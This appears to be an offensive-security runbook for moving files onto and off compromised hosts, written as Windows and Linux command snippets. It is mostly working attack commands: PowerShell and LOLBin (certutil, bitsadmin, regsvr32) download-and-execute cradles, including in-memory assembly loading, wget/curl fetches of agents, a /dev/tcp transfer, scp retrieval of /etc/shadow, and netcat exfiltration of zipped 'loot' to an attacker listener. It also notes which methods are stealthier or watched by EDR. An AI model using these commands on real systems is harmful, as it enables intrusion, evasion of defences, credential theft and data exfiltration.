---
tags: [file-transfer, windows, linux, setup]
---

# 📂 File Transfer (400/500 Level)

> [!ABSTRACT]
> This runbook is a comprehensive reference for moving files onto and off targets.
> **Goal**: Rapidly deliver payloads and exfiltrate data using both native and third-party tools.

---

## 🪟 Windows File Transfer

### 1. PowerShell (The Modern Standard)
```powershell
# Method A: DownloadFile (No progress bar, stealthier)
(New-Object Net.WebClient).DownloadFile("http://<IP>/agent.exe", "C:\Temp\agent.exe")

# Method B: Invoke-WebRequest (May require -UseBasicParsing)
IWR http://<IP>/agent.exe -OutFile C:\Temp\agent.exe -UseBasicParsing

# Method C: DownloadData (In-Memory execution)
$b = (New-Object Net.WebClient).DownloadData("http://<IP>/payload.bin");
[System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null, $null);
```

### 2. LOLBins (Living Off the Land)
```cmd
# Certutil (Highly monitored by EDR)
certutil -urlcache -split -f http://<IP>/agent.exe agent.exe

# BITSAdmin
bitsadmin /transfer job http://<IP>/agent.exe C:\Temp\agent.exe

# Regsvr32 (Remote Script Execution)
regsvr32 /s /n /u /i:http://<IP>/scrobj.sct scrobj.dll
```

### 3. SMB (The "Lateral" Path)
```cmd
# Kali (Host SMB Share)
impacket-smbserver share . -smb2support

# Victim (Download)
copy \\<KALI_IP>\share\agent.exe C:\Temp\agent.exe
```

---

## 🐧 Linux File Transfer

### 1. Bash / Built-ins
```bash
# Wget
wget http://<IP>/agent -O /tmp/agent; chmod +x /tmp/agent

# Curl
curl http://<IP>/agent -o /tmp/agent; chmod +x /tmp/agent

# Bash /dev/tcp (Last resort)
cat < /dev/tcp/<IP>/80 > agent
```

### 2. SCP (If credentials available)
```bash
# Upload to Target
scp agent.exe <USER>@<IP>:/tmp/agent.exe

# Download from Target
scp <USER>@<IP>:/etc/shadow ./shadow.txt
```

---

## 📤 Exfiltration & Data Moving

### 1. Windows: Zip & Base64
```powershell
# Zip folder
Compress-Archive -Path C:\Loot -DestinationPath C:\Temp\loot.zip

# Convert to Base64 (For terminal copy-paste)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("loot.zip"))
```

### 2. Linux: Tar & SCP
```bash
# Tar folder
tar -cvzf loot.tar.gz /home/victim/loot/

# Exfiltrate via Python SimpleHTTPServer (Upload)
# Kali (Listener): nc -l 8000 > loot.tar.gz
# Victim: cat loot.tar.gz > /dev/tcp/<KALI_IP>/8000
```

---

## 🔗 Related Notes
- [[Admin Reference]] - For setting up SMB and SSH key pairs.
- [[Web Attacks]] - For uploading webshells and LFI/RFI exploitation.
- [[03-loaders/RUNBOOK]] - For compiling payloads before transfer.
